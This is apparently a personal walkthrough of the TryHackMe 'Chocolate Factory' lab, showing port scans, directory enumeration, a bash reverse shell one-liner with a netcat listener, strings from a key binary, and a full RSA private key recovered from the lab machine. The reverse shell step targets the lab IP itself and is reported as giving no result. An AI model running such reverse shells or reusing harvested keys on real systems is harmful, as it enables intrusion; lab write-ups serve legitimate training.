#   Tryhackme - Chocolate Factory Walkthrough


##   IP :   10.10.246.57

>   Steps:
1.  Nmap scan:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ nmap -T5 -p0-1023 -vv 10.10.246.57 -oA nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-25 01:21 EDT
Initiating Ping Scan at 01:21
Scanning 10.10.246.57 [2 ports]
Completed Ping Scan at 01:21, 1.52s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:21
Completed Parallel DNS resolution of 1 host. at 01:21, 0.01s elapsed
Initiating Connect Scan at 01:21
Scanning 10.10.246.57 [1024 ports]
Discovered open port 22/tcp on 10.10.246.57
Discovered open port 113/tcp on 10.10.246.57
Discovered open port 80/tcp on 10.10.246.57
Discovered open port 111/tcp on 10.10.246.57
Discovered open port 21/tcp on 10.10.246.57
Discovered open port 110/tcp on 10.10.246.57
Warning: 10.10.246.57 giving up on port because retransmission cap hit (2).
Increasing send delay for 10.10.246.57 from 0 to 5 due to 17 out of 42 dropped probes since last increase.
Discovered open port 100/tcp on 10.10.246.57
Discovered open port 108/tcp on 10.10.246.57
Discovered open port 115/tcp on 10.10.246.57
Discovered open port 101/tcp on 10.10.246.57
Discovered open port 120/tcp on 10.10.246.57
Discovered open port 105/tcp on 10.10.246.57
Discovered open port 123/tcp on 10.10.246.57
Discovered open port 124/tcp on 10.10.246.57
Discovered open port 107/tcp on 10.10.246.57
Discovered open port 109/tcp on 10.10.246.57
Discovered open port 102/tcp on 10.10.246.57
Discovered open port 103/tcp on 10.10.246.57
Discovered open port 116/tcp on 10.10.246.57
Discovered open port 121/tcp on 10.10.246.57
Discovered open port 114/tcp on 10.10.246.57
Discovered open port 106/tcp on 10.10.246.57
Discovered open port 119/tcp on 10.10.246.57
Discovered open port 117/tcp on 10.10.246.57
Discovered open port 112/tcp on 10.10.246.57
Discovered open port 118/tcp on 10.10.246.57
Discovered open port 122/tcp on 10.10.246.57
Completed Connect Scan at 01:21, 25.23s elapsed (1024 total ports)
Nmap scan report for 10.10.246.57
Host is up, received conn-refused (0.21s latency).
Scanned at 2023-06-25 01:21:15 EDT for 25s
Not shown: 918 closed tcp ports (conn-refused), 79 filtered tcp ports (no-response)
PORT    STATE SERVICE    REASON
#21/tcp  open  ftp        syn-ack
#22/tcp  open  ssh        syn-ack
#80/tcp  open  http       syn-ack
100/tcp open  newacct    syn-ack
101/tcp open  hostname   syn-ack
102/tcp open  iso-tsap   syn-ack
103/tcp open  gppitnp    syn-ack
105/tcp open  csnet-ns   syn-ack
106/tcp open  pop3pw     syn-ack
107/tcp open  rtelnet    syn-ack
108/tcp open  snagas     syn-ack
109/tcp open  pop2       syn-ack
110/tcp open  pop3       syn-ack
111/tcp open  rpcbind    syn-ack
112/tcp open  mcidas     syn-ack
113/tcp open  ident      syn-ack
114/tcp open  audionews  syn-ack
115/tcp open  sftp       syn-ack
116/tcp open  ansanotify syn-ack
117/tcp open  uucp-path  syn-ack
118/tcp open  sqlserv    syn-ack
119/tcp open  nntp       syn-ack
120/tcp open  cfdptkt    syn-ack
121/tcp open  erpc       syn-ack
122/tcp open  smakynet   syn-ack
123/tcp open  ntp        syn-ack
124/tcp open  ansatrader syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds

#   --> Important ports
```

2.  Using masscan to get out results faster:

```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Chocolate_Factory]
└─$ masscan 
usage:
masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
 scan some web ports on 10.x.x.x at 10kpps
masscan --nmap
 list those options that are compatible with nmap
masscan -p80 10.0.0.0/8 --banners -oB <filename>
 save results of scan in binary format to <filename>
masscan --open --banners --readscan <filename> -oX <savefile>
 read binary scan results in <filename> and save them as xml in <savefile>

```

3. Gobuster results:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.246.57 -w Documents/gobuster-wordlist/dsstorewordlist.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.246.57
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/25 01:14:14 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/home.php             (Status: 200) [Size: 569]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
Progress: 1828 / 1829 (99.95%)
===============================================================
2023/06/25 01:15:26 Finished
===============================================================

```

4.  Reverse Shell One Liner:
>   In the cmd line of the web: 
```bash
bash -i >& /dev/tcp/10.10.246.57/4444 0>&1
```

Listening on your machine:

```bash
nc -lvnp 4444 
```
>   No result

5.    got strings from the binary file in the web 'key_rev_key'
```bash
 /lib64/ld-linux-x86-64.so.2 libc.so.6 __isoc99_scanf puts __stack_chk_fail printf __cxa_finalize strcmp __libc_start_main GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable 5j %l %j %b %Z %R %J %b =9 AWAVI AUATL []A\A]A^A_ Enter your name: laksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safe Bad name! ;*3$" GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.7698 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry license.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable puts@@GLIBC_2.2.5 _edata __stack_chk_fail@@GLIBC_2.4 printf@@GLIBC_2.2.5 __libc_start_main@@GLIBC_2.2.5 __data_start strcmp@@GLIBC_2.2.5 __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __isoc99_scanf@@GLIBC_2.7 __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment 
 ```

6.  In the /home/charlie , the teleport.pub file gives us :
```bash

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhp2s9zdSH3xFgOtnwJQEOBYsQ1TJsXrSUyT1hA4ENH6Cm5FbUDMvXYrfn8yLdXC2nQ1LCaVLuFrjL2y/aQ9e/yUU6YuLUVXaGqVA8vD+6ecQXBRsvgoGoF6YgN59XmnEyYKqqC4lciTOSUAhc1iF/EuvxwFL8cmiH/uqYuqsOhc2HBiMHfOCi/tFS2TXkm/XUPQi2zKvnim9iEJCB2iitTuXjYRklrIiiYcqifWOSh93X+hh84HCDPok6U0fWMUmjIhmDY6YSGdKNSW1n2ZLOZDK/czgA5FCjdl4tv7NudInJwQRFo5s+VvR1HLcqg3v2W352H6NKD90z9Nhh7kvj charlie@chocolate-factory 
```

Private key from telep[ort file:
```bash

-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln -----END RSA PRIVATE KEY----- 
```